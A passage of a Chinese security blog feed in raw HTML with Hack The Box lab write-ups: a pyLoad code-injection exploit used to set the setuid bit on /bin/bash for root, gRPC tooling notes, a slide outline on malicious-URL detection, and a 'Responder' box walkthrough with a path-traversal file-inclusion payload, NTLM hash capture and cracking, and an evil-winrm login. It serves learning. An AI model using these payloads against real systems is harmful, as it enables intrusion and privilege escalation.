class="hljs-string">&#x27;jk=pyimport%20os;os.system(\&quot;touch%20/tmp/pwnd\&quot;);f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27;</span> \<br>    $<span class="hljs-string">&#x27;http://&lt;target&gt;/flash/addcrypted2&#x27;</span><br></code></pre></td></tr></table></figure><p>看一下 pyload 进程，发现是 root 权限在运行，也就是说接下来我们使用上面的 exp 中的代码执行，也是以 root 权限运行，那我们可以把 &#x2F;bin&#x2F;bash 改为 s 权限 <code>chmod u+s /bin/bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sau@pc:~$ ps aux |grep pyload<br>root        1043  0.0  1.4 1215780 58416 ?       Ssl  May31   0:08 /usr/bin/python3 /usr/local/bin/pyload<br>sau        21965  0.0  0.0   8160  2572 pts/0    S+   01:41   0:00 grep --color=auto pyload<br></code></pre></td></tr></table></figure><p>接下来就是运行上面的代码，值得注意的是，需要经过其中构造的希望被执行的代码只有 url 编码后，才能成功执行</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -i -s -k -X $&#x27;POST<span class="hljs-string">&#x27; \</span><br><span class="hljs-string">    --data-binary $&#x27;</span>jk=pyimport%20os;os.system(\<span class="hljs-string">&quot;`chmod%20u%2Bs%20%2Fbin%2Fbash`&quot;</span>);f=function%20f2()&#123;&#125;;&amp;<span class="hljs-keyword">package</span>=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa<span class="hljs-string">&#x27; \</span><br><span class="hljs-string">    $&#x27;</span>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8000</span>/flash/addcrypted2<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">sau@pc:~$ curl -i -s -k -X $&#x27;POST&#x27; \<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">    --data-binary $<span class="hljs-string">&#x27;jk=pyimport%20os;os.system(\&quot;`chmod%20u%2Bs%20%2Fbin%2Fbash`&quot;);f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27;</span> \</span><br><span class="language-bash">&gt;     $<span class="hljs-string">&#x27;http://127.0.0.1:8000/flash/addcrypted2&#x27;</span></span><br>HTTP/1.1 500 INTERNAL SERVER ERROR<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 21<br>Access-Control-Max-Age: 1800<br>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Methods: OPTIONS, GET, POST<br>Vary: Accept-Encoding<br>Date: Thu, 01 Jun 2023 01:48:24 GMT<br>Server: Cheroot/8.6.0<br><br>Could not decrypt keysau@pc:~$ id<br>uid=1001(sau) gid=1001(sau) groups=1001(sau)<br>sau@pc:~$ /bin/bash -p<br>bash-5.0# id<br>uid=1001(sau) gid=1001(sau) euid=0(root) groups=1001(sau)<br><br></code></pre></td></tr></table></figure><p>提权成功</p><h2 id="gRPC-知识补充"><a href="#gRPC-知识补充" class="headerlink" title="gRPC 知识补充"></a>gRPC 知识补充</h2><p>主要参考博客：<a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-1-c0059362c4b5">gRPC Security Series: Part 1. Introduction to gRPC | by IBM PTC Security | Medium</a></p><p>gRPC 是一个开源高性能的远程过程调用（RPC）框架，支持 Binary framing ，并且因为使用的是支持多路复用的 HHTP&#x2F;2，因此传输更轻便时延较低。</p><blockquote><p>The core problem that <strong>gRPC</strong> is trying to solve is communication delay. gRPC uses HTTP&#x2F;2 as its transfer protocol</p></blockquote><p><img src="/pic/b7d5eeb3b5db59e5aa163404648be6ad_MD5.png"></p><p>Protobuf 文件是定义 gRPC 服务时的核心组件之一。客户端和服务器都需要具有相同的原型文件。proto 文件充当客户端从服务器调用任何可用函数的中间合约。</p><p><img src="/pic/23f4c2271439483fb10935a82dc1cb4e_MD5.png"></p><p>Protobuf 特定用途的架构将数据类型与字段名称相关联，使用整数来标识每个字段。Protobuf 数据仅包含数字，不包含字段名称，与在数据中包含字段名称的系统相比，可提供一些带宽&#x2F;存储节省。</p><p>常用工具：</p><ul><li>gRPC Curl</li><li>gRPC UI</li><li>Evans CLI</li><li>BloomRPC</li><li>Insomnia</li></ul><h3 id="grpcurl"><a href="#grpcurl" class="headerlink" title="grpcurl"></a>grpcurl</h3><p><code>grpcurl -plaintext localhost:50051 list</code></p><p><img src="/pic/131a3691c565f3e8f4401fc1b7e1dd5a_MD5.png"></p><p>让我们尝试使用以下命令挖掘并找出博客服务中存在的服务 <code>grpcurl -plaintext localhost:50051 list blog.BlogService</code></p><p><img src="/pic/e5c9b7aa833fd2f405423dd3bf03ab63_MD5.png"></p><p><code>grpcurl -plaintext localhost:50051 describe blog.BlogService.CreateBlog</code></p><p><img src="/pic/f2dc532077a83ec1dd41efb81fb696c3_MD5.png"></p><p>要了解如何通过此模板传递数据，我们将使用以下命令使用 <strong>msg-template</strong> 标志</p><p><img src="/pic/88d5e48287bfe0b90f984bb9ec05d4fa_MD5.png"></p><p>为了传递一些数据，我们需要使用 <strong>-d</strong> 标志。</p><p><img src="/pic/794ff4c1815fe84c798a476c8961c3ab_MD5.png"></p><h3 id="grpcui"><a href="#grpcui" class="headerlink" title="grpcui"></a>grpcui</h3><p>运行一个可以通过浏览器访问的本地实例，在随机自由端口中启动进程。</p><p><img src="/pic/4bb8316d1d4e11b869e5ea3f230eb231_MD5.png"></p><h2 id="SSH-退出登录命令"><a href="#SSH-退出登录命令" class="headerlink" title="SSH 退出登录命令"></a>SSH 退出登录命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">logout</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Malicious-URL-Detection</title>
    <link href="/2023/05/331e9ddeba17.html"/>
    <url>/2023/05/331e9ddeba17.html</url>
    
    <content type="html"><![CDATA[<h1 id="Malicious-URL-Detection"><a href="#Malicious-URL-Detection" class="headerlink" title="Malicious-URL-Detection"></a>Malicious-URL-Detection</h1><p>实验 PPT 框架</p><h2 id="恶意-URL-介绍"><a href="#恶意-URL-介绍" class="headerlink" title="恶意 URL 介绍"></a>恶意 URL 介绍</h2><h3 id="恶意-URL-的定义"><a href="#恶意-URL-的定义" class="headerlink" title="恶意 URL 的定义"></a>恶意 URL 的定义</h3><h3 id="恶意-URL-的类型"><a href="#恶意-URL-的类型" class="headerlink" title="恶意 URL 的类型"></a>恶意 URL 的类型</h3><h3 id="恶意-URL-的传播方式"><a href="#恶意-URL-的传播方式" class="headerlink" title="恶意 URL 的传播方式"></a>恶意 URL 的传播方式</h3><p><img src="/pic/597819fa1f10581428322eb024a2beb8_1_Figure_1_151912335.png"></p><h3 id="恶意-URL-举例"><a href="#恶意-URL-举例" class="headerlink" title="恶意 URL 举例"></a>恶意 URL 举例</h3><h2 id="恶意-URL-的检测思路"><a href="#恶意-URL-的检测思路" class="headerlink" title="恶意 URL 的检测思路"></a>恶意 URL 的检测思路</h2><h2 id="SVM-详解"><a href="#SVM-详解" class="headerlink" title="SVM 详解"></a>SVM 详解</h2><h2 id="其他基于机器学习的恶意-URL-检测"><a href="#其他基于机器学习的恶意-URL-检测" class="headerlink" title="其他基于机器学习的恶意 URL 检测"></a>其他基于机器学习的恶意 URL 检测</h2><blockquote><p>Detecting Malicious URLs using Machine Learning Techniques</p></blockquote><h3 id="方法与原理详解"><a href="#方法与原理详解" class="headerlink" title="方法与原理详解"></a>方法与原理详解</h3><h3 id="实验结果的对比"><a href="#实验结果的对比" class="headerlink" title="实验结果的对比"></a>实验结果的对比</h3><h2 id="近几年的相关论文与研究趋势"><a href="#近几年的相关论文与研究趋势" class="headerlink" title="近几年的相关论文与研究趋势"></a>近几年的相关论文与研究趋势</h2><h2 id="实验与结果展示"><a href="#实验与结果展示" class="headerlink" title="实验与结果展示"></a>实验与结果展示</h2><h3 id="实验环境与数据集"><a href="#实验环境与数据集" class="headerlink" title="实验环境与数据集"></a>实验环境与数据集</h3><h3 id="SVM-实验流程图"><a href="#SVM-实验流程图" class="headerlink" title="SVM 实验流程图"></a>SVM 实验流程图</h3><h3 id="实验指标"><a href="#实验指标" class="headerlink" title="实验指标"></a>实验指标</h3><h3 id="实验与部分代码展示"><a href="#实验与部分代码展示" class="headerlink" title="实验与部分代码展示"></a>实验与部分代码展示</h3><h3 id="与逻辑回归方法的实验对比"><a href="#与逻辑回归方法的实验对比" class="headerlink" title="与逻辑回归方法的实验对比"></a>与逻辑回归方法的实验对比</h3>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>postgraduate</category>
      
      <category>experiment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Start_Point</title>
    <link href="/2023/05/0ec9b4c0392c.html"/>
    <url>/2023/05/0ec9b4c0392c.html</url>
    
    <content type="html"><![CDATA[<p>HTB 的 Very easy 靶机，用来帮助熟悉 Hack The Box 的基础操作和一些靶机的基础环节设置，以及一些基础知识的补充</p><h1 id="Start-Point"><a href="#Start-Point" class="headerlink" title="Start Point"></a>Start Point</h1><h2 id="Web-Nmap-smb"><a href="#Web-Nmap-smb" class="headerlink" title="Web_Nmap_smb"></a>Web_Nmap_smb</h2><h2 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis_cli"></a>redis_cli</h2><p>How to install redis-cli? redis-cli could be installed by <code>sudo apt-get install redis-tools</code> which contains redis-cli.After we connect redis server, <code>INFO</code> will help us to get the information about database. Beside, <code>keys *</code> could get all keys and <code>get &#39;key&#39;</code> could get value of key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/usr]<br>└─$ redis-cli -h<br>redis-cli 7.0.11<br><br>Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]<br>  -h &lt;hostname&gt;      Server hostname (default: 127.0.0.1).<br>  -p &lt;port&gt;          Server port (default: 6379).<br>  -s &lt;socket&gt;        Server socket (overrides hostname and port).<br>  -a &lt;password&gt;      Password to use when connecting to the server.<br>                     You can also use the REDISCLI_AUTH environment<br>                     variable to pass this password more safely<br>                     (<span class="hljs-keyword">if</span> both are used, this argument takes precedence).<br>  --user &lt;username&gt;  Used to send ACL style <span class="hljs-string">&#x27;AUTH username pass&#x27;</span>. Needs -a.<br>  --pass &lt;password&gt;  Alias of -a <span class="hljs-keyword">for</span> consistency with the new --user option.<br>  --askpass          Force user to input password with mask from STDIN.<br>                     If this argument is used, <span class="hljs-string">&#x27;-a&#x27;</span> and REDISCLI_AUTH<br>                     environment variable will be ignored.<br>  -u &lt;uri&gt;           Server URI.<br>  -r &lt;repeat&gt;        Execute specified <span class="hljs-built_in">command</span> N <span class="hljs-built_in">times</span>.<br>  -i &lt;interval&gt;      When -r is used, waits &lt;interval&gt; seconds per <span class="hljs-built_in">command</span>.<br>                     It is possible to specify sub-second <span class="hljs-built_in">times</span> like -i 0.1.<br>                     This interval is also used <span class="hljs-keyword">in</span> --scan and --<span class="hljs-built_in">stat</span> per cycle.<br>                     and <span class="hljs-keyword">in</span> --bigkeys, --memkeys, and --hotkeys per 100 cycles.<br>  -n &lt;db&gt;            Database number.<br>  -2                 Start session <span class="hljs-keyword">in</span> RESP2 protocol mode.<br>  -3                 Start session <span class="hljs-keyword">in</span> RESP3 protocol mode.<br>  -x                 Read last argument from STDIN (see example below).<br>  -X                 Read &lt;tag&gt; argument from STDIN (see example below).<br>  -d &lt;delimiter&gt;     Delimiter between response bulks <span class="hljs-keyword">for</span> raw formatting (default: \n).<br>  -D &lt;delimiter&gt;     Delimiter between responses <span class="hljs-keyword">for</span> raw formatting (default: \n).<br>  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).<br>  -e                 Return <span class="hljs-built_in">exit</span> error code when <span class="hljs-built_in">command</span> execution fails.<br>  --tls              Establish a secure TLS connection.<br>  --sni &lt;host&gt;       Server name indication <span class="hljs-keyword">for</span> TLS.<br>  --cacert &lt;file&gt;    CA Certificate file to verify with.<br>  --cacertdir &lt;<span class="hljs-built_in">dir</span>&gt;  Directory <span class="hljs-built_in">where</span> trusted CA certificates are stored.<br>                     If neither cacert nor cacertdir are specified, the default<br>                     system-wide trusted root certs configuration will apply.<br>  --insecure         Allow insecure TLS connection by skipping cert validation.<br>  --cert &lt;file&gt;      Client certificate to authenticate with.<br>  --key &lt;file&gt;       Private key file to authenticate with.<br>  --tls-ciphers &lt;list&gt; Sets the list of preferred ciphers (TLSv1.2 and below)<br>                     <span class="hljs-keyword">in</span> order of preference from highest to lowest separated by colon (<span class="hljs-string">&quot;:&quot;</span>).<br>                     See the ciphers(1ssl) manpage <span class="hljs-keyword">for</span> more information about the syntax of this string.<br>  --tls-ciphersuites &lt;list&gt; Sets the list of preferred ciphersuites (TLSv1.3)<br>                     <span class="hljs-keyword">in</span> order of preference from highest to lowest separated by colon (<span class="hljs-string">&quot;:&quot;</span>).<br>                     See the ciphers(1ssl) manpage <span class="hljs-keyword">for</span> more information about the syntax of this string,<br>                     and specifically <span class="hljs-keyword">for</span> TLSv1.3 ciphersuites.<br>  --raw              Use raw formatting <span class="hljs-keyword">for</span> replies (default when STDOUT is<br>                     not a <span class="hljs-built_in">tty</span>).<br>  --no-raw           Force formatted output even when STDOUT is not a <span class="hljs-built_in">tty</span>.<br>  --quoted-input     Force input to be handled as quoted strings.<br>  --csv              Output <span class="hljs-keyword">in</span> CSV format.<br>  --json             Output <span class="hljs-keyword">in</span> JSON format (default RESP3, use -2 <span class="hljs-keyword">if</span> you want to use with RESP2).<br>  --quoted-json      Same as --json, but produce ASCII-safe quoted strings, not Unicode.<br>  --show-pushes &lt;yn&gt; Whether to <span class="hljs-built_in">print</span> RESP3 PUSH messages.  Enabled by default when<br>                     STDOUT is a <span class="hljs-built_in">tty</span> but can be overridden with --show-pushes no.<br>  --<span class="hljs-built_in">stat</span>             Print rolling stats about server: mem, clients, ...<br>  --latency          Enter a special mode continuously sampling latency.<br>                     If you use this mode <span class="hljs-keyword">in</span> an interactive session it runs<br>                     forever displaying real-time stats. Otherwise <span class="hljs-keyword">if</span> --raw or<br>                     --csv is specified, or <span class="hljs-keyword">if</span> you redirect the output to a non<br>                     TTY, it samples the latency <span class="hljs-keyword">for</span> 1 second (you can use<br>                     -i to change the interval), <span class="hljs-keyword">then</span> produces a single output<br>                     and exits.<br>  --latency-history  Like --latency but tracking latency changes over time.<br>                     Default time interval is 15 sec. Change it using -i.<br>  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.<br>                     Default time interval is 1 sec. Change it using -i.<br>  --lru-test &lt;keys&gt;  Simulate a cache workload with an 80-20 distribution.<br>  --replica          Simulate a replica showing commands received from the master.<br>  --rdb &lt;filename&gt;   Transfer an RDB dump from remote server to <span class="hljs-built_in">local</span> file.<br>                     Use filename of <span class="hljs-string">&quot;-&quot;</span> to write to stdout.<br> --functions-rdb &lt;filename&gt; Like --rdb but only get the <span class="hljs-built_in">functions</span> (not the keys)<br>                     when getting the RDB dump file.<br>  --pipe             Transfer raw Redis protocol from stdin to server.<br>  --pipe-timeout &lt;n&gt; In --pipe mode, abort with error <span class="hljs-keyword">if</span> after sending all data.<br>                     no reply is received within &lt;n&gt; seconds.<br>                     Default <span class="hljs-built_in">timeout</span>: 30. Use 0 to <span class="hljs-built_in">wait</span> forever.<br>  --bigkeys          Sample Redis keys looking <span class="hljs-keyword">for</span> keys with many elements (complexity).<br>  --memkeys          Sample Redis keys looking <span class="hljs-keyword">for</span> keys consuming a lot of memory.<br>  --memkeys-samples &lt;n&gt; Sample Redis keys looking <span class="hljs-keyword">for</span> keys consuming a lot of memory.<br>                     And define number of key elements to sample<br>  --hotkeys          Sample Redis keys looking <span class="hljs-keyword">for</span> hot keys.<br>                     only works when maxmemory-policy is *lfu.<br>  --scan             List all keys using the SCAN <span class="hljs-built_in">command</span>.<br>  --pattern &lt;pat&gt;    Keys pattern when using the --scan, --bigkeys or --hotkeys<br>                     options (default: *).<br>  --quoted-pattern &lt;pat&gt; Same as --pattern, but the specified string can be<br>                         quoted, <span class="hljs-keyword">in</span> order to pass an otherwise non binary-safe string.<br>  --intrinsic-latency &lt;sec&gt; Run a <span class="hljs-built_in">test</span> to measure intrinsic system latency.<br>                     The <span class="hljs-built_in">test</span> will run <span class="hljs-keyword">for</span> the specified amount of seconds.<br>  --<span class="hljs-built_in">eval</span> &lt;file&gt;      Send an EVAL <span class="hljs-built_in">command</span> using the Lua script at &lt;file&gt;.<br>  --ldb              Used with --<span class="hljs-built_in">eval</span> <span class="hljs-built_in">enable</span> the Redis Lua debugger.<br>  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, <span class="hljs-keyword">in</span><br>                     this mode the server is blocked and script changes are<br>                     not rolled back from the server memory.<br>  --cluster &lt;<span class="hljs-built_in">command</span>&gt; [args...] [opts...]<br>                     Cluster Manager <span class="hljs-built_in">command</span> and arguments (see below).<br>  --verbose          Verbose mode.<br>  --no-auth-warning  Don\<span class="hljs-string">&#x27;t show warning message when using password on command</span><br><span class="hljs-string">                     line interface.</span><br><span class="hljs-string">  --help             Output this help and exit.</span><br><span class="hljs-string">  --version          Output version and exit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Cluster Manager Commands:</span><br><span class="hljs-string">  Use --cluster help to list all available cluster manager commands.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Examples:</span><br><span class="hljs-string">  cat /etc/passwd | redis-cli -x set mypasswd</span><br><span class="hljs-string">  redis-cli -D &quot;&quot; --raw dump key &gt; key.dump &amp;&amp; redis-cli -X dump_tag restore key2 0 dump_tag replace &lt; key.dump</span><br><span class="hljs-string">  redis-cli -r 100 lpush mylist x</span><br><span class="hljs-string">  redis-cli -r 100 -i 1 info | grep used_memory_human:</span><br><span class="hljs-string">  redis-cli --quoted-input set &#x27;</span><span class="hljs-string">&quot;null-\x00-separated&quot;</span><span class="hljs-string">&#x27; value</span><br><span class="hljs-string">  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3</span><br><span class="hljs-string">  redis-cli --scan --pattern &#x27;</span>*:12345*<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)</span><br><span class="hljs-string"></span><br><span class="hljs-string">When no command is given, redis-cli starts in interactive mode.</span><br><span class="hljs-string">Type &quot;help&quot; in interactive mode for information on available commands</span><br><span class="hljs-string">and settings.</span><br></code></pre></td></tr></table></figure><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.237.187<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 03:00 EDT<br>Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 47.32% <span class="hljs-keyword">done</span>; ETC: 03:00 (0:00:10 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> unika.htb (10.129.237.187)<br>Host is up (0.20s latency).<br>Not shown: 65532 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>5985/tcp open  wsman<br>7680/tcp open  pando-pub<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.09 seconds<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p80,5985,7680 10.129.237.187<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 03:02 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> unika.htb (10.129.237.187)<br>Host is up (0.067s latency).<br><br>PORT     STATE SERVICE    VERSION<br>80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> (Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span><br>|_http-title: Unika<br><span class="hljs-number">5985</span>/tcp open  http       Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">7680</span>/tcp open  pando-pub?<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">49.15</span> seconds<br></code></pre></td></tr></table></figure><blockquote><p>Windows远程管理（<strong>WinRM默认运行在5985端口</strong>），是一个Windows本地内置的远程管理协议，基本上使用简单对象访问协议与远程计算机和服务器交互，以及操作系统和应用程序。</p></blockquote><p>在浏览器中，访问 IP 发现被重定向到了 unika.htb，于是在&#x2F;etc&#x2F;hosts 文件中添加 <code>IP    unika.htb</code> 的对应，这样我们就可以直接访问 unika.htb 页面了，发现页面中很多都是锚点，在切换语言的位置发现</p><p><img src="/pic/daca836bfdb79620e59485b9228fd834_MD5.png"></p><h3 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h3><p>看到这个 URL，应当考虑是否存在本地文件包含和远程文件包含漏洞，我们构造 <code>…/…/…/…/…/…/…/…/windows/system32/drivers/etc/hosts</code> 将其作为 page 参数的值</p><p><img src="/pic/fc05c139718a4a6061e71a80aef3fa86_MD5.png"></p><p>发现的确存在本地包含漏洞，接下来尝试是否存在远程文件包含漏洞，因为前面已经确定了是 Windows 的机器（nmap 扫描），所以接下来我们将使用 Responder 来获取 NTLM 的值</p><blockquote><p>在PHP配置文件PHP.ini中:<br>“allow_url_include”默认设置为“Off”,PHP不加载远程HTTP或FTP,url以防止远程文件包含攻击。<br>然而，即使allow_url_include和allow_url_fopen被设置为“Off”，PHP也不会阻止加载SMB url。<br>我们可以误用这个功能来窃取NTLM哈希</p></blockquote><blockquote><p>Responder 可以进行许多不同类型的攻击，但对于这个场景，它将设置为一个恶意的 SMB 服务器。<br>当目标机器试图对该服务器执行NTLM身份验证时，Responder向服务器发送一个请求，要求服务器用用户的密码加密。当服务器响应时，Responder将使用质询和加密的响应来生成NetNTLMv2（NetNTLMv2质询&#x2F;响应是一个特定格式化的字符串，包括质询和响应。）而我们不能逆转在NetNTLMv2中，我们可以尝试许多不同的常见密码，以查看是否有任何密码生成相同的质询响应，如果找到了，我们就知道这就是密码。这通常被称为散列破解，我们将使用一个名为“John The Ripper”的程序来实现。</p></blockquote><h3 id="Responder-获取-NTLM-认证中的密码哈希值"><a href="#Responder-获取-NTLM-认证中的密码哈希值" class="headerlink" title="Responder 获取 NTLM 认证中的密码哈希值"></a>Responder 获取 NTLM 认证中的密码哈希值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./Responder.py -I tun0<br></code></pre></td></tr></table></figure><p><img src="/pic/b490fa3df62dc473cf990cb09c07a0a4_MD5.png"></p><p>接下来我们复制以上内容使用 john 进行破解操作</p><p><img src="/pic/02ec82807fa1d834a2cc601bb37ac57d_MD5.png"></p><p>最后使用 evil-winrm 来连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i IP -u administrator -p badminton<br></code></pre></td></tr></table></figure><p>最后在 mike 的桌面找到了 flag</p><h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><p>Three is a Linux box that includes a website, which utilizes an AWS S3 bucket as its cloud-storage device. We can exploit this poorly configured S3 bucket and upload a reverse shell on it. We can then visit the corresponding URL to execute the reverse file and ultimately retrieve the flag.</p><p>基础的信息收集发现，在 CONTACT 中有一个邮箱地址，邮箱的后缀使用的是 thetoppers.htb，我们把 thetoppers.htb 和 IP 的对应写入 hosts 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.227.248<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 22:00 EDT<br>Warning: 10.129.227.248 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.227.248<br>Host is up (0.020s latency).<br>Not shown: 65284 closed tcp ports (reset), 249 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span 